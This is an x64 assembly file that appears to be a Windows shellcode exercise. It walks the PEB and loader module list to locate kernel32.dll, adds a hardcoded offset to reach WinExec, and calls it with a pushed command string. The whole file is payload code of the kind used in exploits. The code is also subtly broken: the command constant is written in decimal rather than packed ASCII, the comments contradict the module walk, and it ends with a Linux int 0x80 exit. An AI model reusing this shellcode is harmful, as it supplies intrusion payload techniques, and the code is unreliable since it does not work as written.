section .data

section .bss

section .text
    global _start

_start:
    xor rax,rax
    mov al,60h
    push QWORD gs:[rax]     ;pointer to PEB
    pop rax
    mov rax,[rax+0x18]      ;PEB_0x18->LDR
    mov rax,[rax+0x20]      ;LDR+0x20h->inmemordermodulelist struct(flink)
    ;mov rax,[rax]
    push QWORD [rax]
    pop rax                 ;inmemordermodulelist of 1st LDR_DATA_TABLE_ENTRY->my.exe
    ;mov rax,[rax]          ;inmemordermodulelist of 2nd LDR_DATA_TABLE_ENTRY->ntdll.dll
    push QWORD [rax]
    pop rax                 ;inmemordermodulelist of 1st LDR_DATA_TABLE_ENTRY->my.exe
    mov rax,[rax+0x20]      ;base address of kernel32.dll
    xor rdx,rdx
    mov edx,0x4F3c0         ;bx=WinexecAddress-Kernel32BaseAddress -> 4F3c0
    ;mov edx,0x4F3c0         ;bx=WinexecAddress-Kernel32BaseAddress -> 70B00
    ;shl edx,8               ;70B --> 70B00
    add rax,rdx             ;Winexec
    xor rcx,rcx
    push rcx                ;null term
    mov rcx,65786526366163  ;
    push rcx 
    xor rcx,rcx
    mov rdx,rsp
    inc rcx
    push rcx
    push rdx
    call rax
    xor rdx, rdx             ; Exit code = 0
    mov rax, 1               ; Syscall number for exit
    int 0x80                 ; Trigger syscall